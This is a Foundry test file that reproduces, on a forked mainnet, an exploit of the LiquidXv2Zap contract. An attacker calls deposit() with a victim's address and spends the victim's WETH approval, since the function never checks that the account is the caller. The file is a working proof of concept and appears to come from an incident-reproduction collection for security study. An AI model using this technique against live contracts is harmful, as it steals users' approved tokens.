// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @Info
// LQDX LiquidXv2Zap Contract : https://etherscan.io/address/0x364f17a23ae4350319b7491224d10df5796190bc#codeL490

// @NewsTrack
// SlowMist : https://twitter.com/SlowMist_Team/status/1744972012865671452

// Note: the problem lies in the `deposit` function where there is no check that the `account` should be `msg.sender`, thus `account`'s approval on the `zap` can be spent to buy tokens and add liquidity.


interface ILiquidXv2Zap {
    struct swapRouter {
        string platform;
        address tokenIn;
        address tokenOut;
        uint256 amountOutMin;
        uint256 meta; // fee, flag(stable), 0=v2
        uint256 percent;
    }
    struct swapLine {
        swapRouter[] swaps;
    }
    struct swapBlock {
        swapLine[] lines;
    }

    struct swapPath {
        swapBlock[] path;
    }

    function deposit(
        address account, 
        address token, 
        address tokenM, 
        swapPath calldata path, 
        address token0, 
        address token1, 
        uint256[3] calldata amount, 
        uint256 basketId
    ) external payable returns(uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

interface ILiquidXv2Pair {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract Exploit is Test {
    
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 LQDX = IERC20(0x872952d3c1Caf944852c5ADDa65633F1Ef218A26);
    ILiquidXv2Zap zap = ILiquidXv2Zap(0x364f17A23AE4350319b7491224d10dF5796190bC);
    ILiquidXv2Pair WETH_LQDX_pair = ILiquidXv2Pair(0x1884C3D0ac1A3ACF0698b2a19866cee4cE27c31A);
    
    address victim = address(0x1);
    address attacker = address(0xbad);


    function setUp() public {
        vm.createSelectFork("mainnet", 19165893);
        vm.deal(victim, 1 ether);
        vm.deal(attacker, 1 ether);
        deal(address(WETH), victim, 10 ether); // the approved funds to be stolen
        emit log_named_uint(
            "victim WETH balance (ether) before attack", (WETH.balanceOf(victim)) / 1 ether
        );
        vm.prank(victim);
        WETH.approve(address(zap), 10 ether);
        emit log_named_uint(
            "victim approved on zap contract (ether)", (WETH.allowance(victim, address(zap))) / 1 ether
        );        
    }

    function testExploit() public {
        vm.startPrank(attacker);
        (uint112 lqdx_before, uint112 weth_before,) = WETH_LQDX_pair.getReserves();
        emit log_named_uint("before attack, LQDX in the pool", lqdx_before / 1 ether);
        emit log_named_uint("before attack, WETH in the pool", weth_before / 1 ether);

        // attack starts here
        ILiquidXv2Zap.swapBlock[] memory path;
        uint[3] memory amounts = [WETH.allowance(victim, address(zap)),0,0];
        zap.deposit(victim, 
            address(WETH), 
            address(WETH), 
            ILiquidXv2Zap.swapPath({path:path}), 
            address(WETH), 
            address(LQDX), 
            amounts,
        0);

        (uint112 lqdx_after, uint112 weth_after,) = WETH_LQDX_pair.getReserves();
        emit log_named_uint("after attack, LQDX in the pool", lqdx_after / 1 ether);
        emit log_named_uint("after attack, WETH in the pool", weth_after / 1 ether);
        emit log_named_uint(
            "victim WETH balance (ether) after attack", (WETH.balanceOf(victim)) / 1 ether
        );           
    }
}
